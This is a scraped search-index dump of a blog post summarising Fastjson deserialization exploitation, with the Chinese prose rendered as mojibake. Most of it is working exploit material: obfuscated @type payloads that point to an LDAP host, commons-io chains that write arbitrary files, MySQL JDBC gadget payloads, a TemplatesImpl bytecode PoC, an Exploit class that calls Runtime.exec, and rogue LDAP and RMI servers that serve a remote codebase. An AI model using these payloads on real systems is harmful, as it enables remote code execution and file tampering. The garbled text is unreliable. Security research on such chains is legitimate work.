{\"name\":{\"@\\u0074\\u0079\\u0070\\u0065\":/*asdasd*/\\r\\n\"java.l\\x61ng.Cl\\x61ss\",\"val\":\"com.sun.rowset.JdbcRo\\x77\\x53etImpl\"},\"x\":{\"@\\u0074\\u0079\\u0070\\u0065\":\"com.sun.rowset.Jd\\x62\\x63RowSetImpl\",\"dataSourceName\":\"ldap://11.11.11.11:1389/Exploit\",\"autoCommit\":true}}} ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:5:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"fastjson1.2.68åˆ©ç”¨ å’Œ1.2.47ç‰ˆæœ¬çš„æ¼æ´ä¸€æ ·ï¼Œ68ç‰ˆæœ¬ä¹Ÿæ˜¯å¯¹checkAutoType()çš„çš„ç»•è¿‡ï¼Œæ— éœ€è€ƒè™‘fastjsonçš„é»‘åå•è¿›è¡Œåˆ©ç”¨ã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ä»»æ„æ–‡ä»¶å†™å…¥ å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg ä¾èµ–äºcommons-io 2.0 - 2.6 çš„POCï¼š { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)\" }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"encoding\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } }} ä¾èµ–äºcommons-io 2.7 - 2.8.0 çš„POCï¼š { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)\", \"start\":0, \"end\":2147483647 }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"charsetName\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } æœ¬åœ°windowsæµ‹è¯•ç¬¬ä¸€æ¬¡æˆåŠŸå†™å…¥ï¼Œåé¢çš„åªåˆ›å»ºäº†æ–‡ä»¶å¹¶æ²¡æœ‰å†™å…¥ï¼Œéœ€è¦åˆ·æ–°ç¼“å­˜æˆ–è€…é‡å¯æœåŠ¡æ‰è¡Œ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:1","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"Mysql RCE https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg BlackHat2021 è…¾è®¯ç„æ­¦å®éªŒå®¤çš„å¤§ä½¬å…¬å¼€äº†68ç‰ˆæœ¬mysqlçš„åˆ©ç”¨é“¾ã€‚é…åˆæ¶æ„mysqlæœåŠ¡ç«¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke\u0026Expires=1629276415\u0026Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D 5.1.x(SSRF)ï¼Œ5.1.11-5.1.48(ååºåˆ—åŒ–é“¾) { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_CommonsCollections4_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } 6.0.2/6.0.3(ååºåˆ—åŒ–) { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\u0026statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026user=yso_CommonsCollections4_calc\" } } } 8.0.19(ååºåˆ—åŒ–é“¾)ï¼Œ8.0.19+(SSRF) { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\", \"proxy\": { \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\", \"connectionUrl\":{ \"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":[{ \"host\":\"\" }], \"slaves\":[], \"properties\":{ \"host\":\"127.0.0.1\", \"user\":\"yso_CommonsCollections4_calc\", \"dbname\":\"dbname\", \"password\":\"pass\", \"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\":\"true\" } } } } ä»¥ä¸‹ä¸ºå»å¹´å»å¹´è°ƒè¯•åˆ†ææ—¶çš„ç¬”è®°ï¼Œå¤§é‡å‚è€ƒï¼ˆæ‹™åŠ£æ¨¡ä»¿ï¼‰äº†phith0nã€kingxã€mi1k7eaç­‰å¸ˆå‚…çš„æ–‡ç« ï¼Œä»…ä¾›å‚è€ƒã€‚å¼ºçƒˆå»ºè®®é˜…è¯»åŸæ–‡ã€‚æ–‡æœ«æœ‰é“¾æ¥ 0x02 è°ƒè¯•åˆ†æ Fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚ fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼ŒFastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚å‡ºç°å®‰å…¨é—®é¢˜å½±å“èŒƒå›´å¾ˆå¹¿ã€‚ é‡‡ç”¨ä¸€ç§â€œå‡å®šæœ‰åºå¿«é€ŸåŒ¹é…â€çš„ç®—æ³•ï¼Œæ˜¯å·ç§°Javaä¸­æœ€å¿«çš„jsonåº“ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:2","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ç¯å¢ƒæ­å»º ideaä¸­æ–°å»ºmavené¡¹ç›®ï¼Œåœ¨pom.xmlä¸­æ·»åŠ ä»¥ä¸‹ä»£ç å³å¯ \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003efastjsonVulTest\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003csource\u003e8\u003c/source\u003e \u003ctarget\u003e8\u003c/target\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.24\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-compress\u003c/artifactId\u003e \u003cversion\u003e1.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-codec\u003c/groupId\u003e \u003cartifactId\u003ecommons-codec\u003c/artifactId\u003e \u003cversion\u003e1.6\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-io\u003c/groupId\u003e \u003cartifactId\u003ecommons-io\u003c/artifactId\u003e \u003cversion\u003e1.4\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.unboundid\u003c/groupId\u003e \u003cartifactId\u003eunboundid-ldapsdk\u003c/artifactId\u003e \u003cversion\u003e4.0.9\u003c/version\u003e \u003cscope\u003ecompile\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-dbcp\u003c/artifactId\u003e \u003cversion\u003e9.0.8\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 0x03 FastJSONåŸºç¡€ å½“ååºåˆ—åŒ–ä¸ºJSON.parseObject(*)å½¢å¼å³æœªæŒ‡å®šclassæ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„getteræ–¹æ³•ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ï¼Œå…¶ä¸­propertieså±æ€§çš„getteræ–¹æ³•è°ƒç”¨äº†ä¸¤æ¬¡ï¼› å½“ååºåˆ—åŒ–ä¸ºJSON.parseObject(,.class)å½¢å¼å³æŒ‡å®šclassæ—¶ï¼Œåªè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ã€propertieså±æ€§çš„getteræ–¹æ³•ï¼› å½“ååºåˆ—åŒ–ä¸ºJSON.parseObject()å½¢å¼å³æœªæŒ‡å®šclassè¿›è¡Œååºåˆ—åŒ–æ—¶å¾—åˆ°çš„éƒ½æ˜¯JSONObjectç±»å¯¹è±¡ï¼Œè€Œåªè¦æŒ‡å®šäº†classå³JSON.parseObject(,*.class)å½¢å¼å¾—åˆ°çš„éƒ½æ˜¯ç‰¹å®šçš„Studentç±»ï¼› å¦‚æœéœ€è¦è¿˜åŸå‡ºprivateå±æ€§çš„è¯ï¼Œè¿˜éœ€è¦åœ¨JSON.parseObject/JSON.parseä¸­åŠ ä¸ŠFeature.SupportNonPublicFieldå‚æ•°ã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:7:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åŸºäºTemplateImplçš„åˆ©ç”¨é“¾ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ä¾èµ– Javaå­—èŠ‚ç çš„æ‰§è¡Œï¼Œéœ€è¦è®¾ç½®Feature.SupportNonPublicFieldè¿›è¡Œååºåˆ—åŒ–æ“ä½œæ‰èƒ½æˆåŠŸè§¦å‘åˆ©ç”¨ã€‚ **** ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:1","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POC Test.java package com; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\"calc\"); } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException { } public static void main(String[] args) throws Exception { Test t = new Test(); } } PoC.java package com; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; import org.apache.commons.codec.binary.Base64; import org.apache.commons.compress.utils.IOUtils; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class PoC { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } return Base64.encodeBase64String(bos.toByteArray()); } public static void main(String args[]){ try { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\src\\\\main\\\\java\\\\com\\\\Impl\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':{ },\\\"_outputProperties\\\":{ },\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //Object obj = JSON.parse(text1, Feature.SupportNonPublicField); } catch (Exception e) { e.printStackTrace(); } } } PoCä¸­å‡ ä¸ªé‡è¦çš„Jsoné”®çš„å«ä¹‰ï¼š @typeâ€”â€”æŒ‡å®šçš„è§£æç±»ï¼Œå³com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplï¼ŒFastjsonæ ¹æ®æŒ‡å®šç±»å»ååºåˆ—åŒ–å¾—åˆ°è¯¥ç±»çš„å®ä¾‹ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹åªä¼šå»ååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼Œåœ¨PoCä¸­ï¼Œ_bytecodeså’Œ_nameéƒ½æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥æƒ³è¦ååºåˆ—åŒ–è¿™ä¸¤ä¸ªå±æ€§ï¼Œéœ€è¦åœ¨parseObject()æ—¶è®¾ç½®Feature.SupportNonPublicFieldï¼› _bytecodesâ€”â€”æ˜¯æˆ‘ä»¬æŠŠæ¶æ„ç±»çš„.classæ–‡ä»¶äºŒè¿›åˆ¶æ ¼å¼è¿›è¡ŒBase64ç¼–ç åå¾—åˆ°çš„å­—ç¬¦ä¸²ï¼› _outputPropertiesâ€”â€”æ¼æ´åˆ©ç”¨é“¾çš„å…³é”®ä¼šè°ƒç”¨å…¶å‚æ•°çš„getOutputProperties()æ–¹æ³•ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼› _tfactory:{}â€”â€”åœ¨defineTransletClasses()æ—¶ä¼šè°ƒç”¨getExternalExtensionsMap()ï¼Œå½“ä¸ºnullæ—¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¦å¯¹_tfactoryè®¾ç½®ï¼› ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:2","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åˆ†æ å½“è§£æåˆ°_outputPropertiesçš„å†…å®¹æ—¶ï¼Œçœ‹åˆ°å‰é¢çš„ä¸‹åˆ’çº¿è¢«å»æ‰äº†ï¼š è·Ÿè¿›è¯¥æ–¹æ³•ï¼Œå‘ç°ä¼šé€šè¿‡åå°„æœºåˆ¶è°ƒç”¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•ç±»å‹æ˜¯Propertiesã€æ»¡è¶³ä¹‹å‰æˆ‘ä»¬å¾—åˆ°çš„ç»“è®ºå³Fastjsonååºåˆ—åŒ–ä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„ç±»çš„æŸäº›æ»¡è¶³æ¡ä»¶çš„getteræ–¹æ³•ï¼š è·Ÿè¿›å»ï¼Œåœ¨getOutputProperties()æ–¹æ³•ä¸­è°ƒç”¨äº†newTransformer().getOutputProperties()æ–¹æ³•ï¼š è·Ÿè¿›TemplatesImpl.newTransformer()æ–¹æ³•ï¼Œçœ‹åˆ°è°ƒç”¨äº†getTransletInstance()æ–¹æ³•ï¼š ç»§ç»­è·Ÿè¿›å»æŸ¥çœ‹getTransletInstance()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è§£æåˆ°Testç±»å¹¶æ–°å»ºä¸€ä¸ªTestç±»å®ä¾‹ï¼Œæ³¨æ„å‰é¢ä¼šå…ˆè°ƒç”¨defineTransletClasses()æ–¹æ³•æ¥ç”Ÿæˆä¸€ä¸ªJavaç±»ï¼ˆTestç±»ï¼‰ï¼š å†å¾€ä¸‹å°±æ˜¯æ–°å»ºTestç±»å®ä¾‹çš„è¿‡ç¨‹ï¼Œå¹¶è°ƒç”¨Testç±»çš„æ„é€ å‡½æ•°ï¼š å†ä¹‹åå°±æ˜¯å¼¹è®¡ç®—å™¨äº†ã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:3","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ä¾èµ– åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬\u003c=6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬\u003c=6u211ã€7u201ã€8u191ã€‚ å¹¶ä¸”å®é™…åˆ©ç”¨ä¸­éœ€è¦è¿æ¥è¿œç¨‹æ¶æ„æœåŠ¡å™¨ï¼Œåœ¨ç›®æ ‡æ²¡å¤–ç½‘çš„æƒ…å†µä¸‹æ— æ³•ç›´æ¥åˆ©ç”¨ï¼› ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:1","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POC Exploit.java æ³¨ï¼šç¼–è¯‘exploit.classä¸­ä¸èƒ½æœ‰åŒ…å import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.io.Serializable; import java.util.Hashtable; public class Exploit implements ObjectFactory, Serializable { /** * è¦æ³¨å†Œçš„Exploit */ public Exploit() { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } public static void main(String[] args) { Exploit exploit = new Exploit(); } } ldap package com.JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LdapServer { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8000/#Exploit\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } RMI package com.JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(11099); System.out.println","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:2","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åˆ†æ å…ˆæ˜¯è°ƒè¯•åˆ°äº†setDataSourceName()å‡½æ•°ï¼Œå°†dataSourceNameå€¼è®¾ç½®ä¸ºç›®æ ‡RMIæœåŠ¡çš„åœ°å€ï¼š æ¥ç€è°ƒç”¨åˆ°setAutoCommit()å‡½æ•°ï¼Œè®¾ç½®autoCommitå€¼ï¼Œå…¶ä¸­è°ƒç”¨äº†connect()å‡½æ•°ï¼š è·Ÿè¿›connect()å‡½æ•°ï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰çš„JNDIæ³¨å…¥çš„ä»£ç å³InitialContext.lookup()ï¼Œå¹¶ä¸”å…¶å‚æ•°æ˜¯è°ƒç”¨this.getDataSourceName() è·å–çš„ã€å³åœ¨å‰é¢setDataSourceName()å‡½æ•°ä¸­è®¾ç½®çš„å€¼ï¼Œå› æ­¤lookupå‚æ•°å¤–éƒ¨å¯æ§ï¼Œå¯¼è‡´å­˜åœ¨JNDIæ³¨å…¥æ¼æ´ï¼š å†å¾€ä¸‹å°±æ˜¯JNDIæ³¨å…¥çš„è°ƒç”¨è¿‡ç¨‹äº†ï¼Œæœ€åæ˜¯æˆåŠŸåˆ©ç”¨JNDIæ³¨å…¥è§¦å‘Fastjsonååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œæ•ˆæœã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:3","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åŸºäºBasicDataSourceçš„åˆ©ç”¨é“¾ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ä¾èµ– BasicDataSourceç±»åœ¨æ—§ç‰ˆæœ¬çš„ tomcat-dbcp åŒ…ä¸­ï¼Œå¯¹åº”çš„è·¯å¾„æ˜¯ org.apache.tomcat.dbcp.dbcp.BasicDataSourceã€‚ æ¯”å¦‚ï¼š6.0.53ã€7.0.81ç­‰ç‰ˆæœ¬ã€‚MVN ä¾èµ–å†™æ³•å¦‚ä¸‹ï¼š \u003c!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e 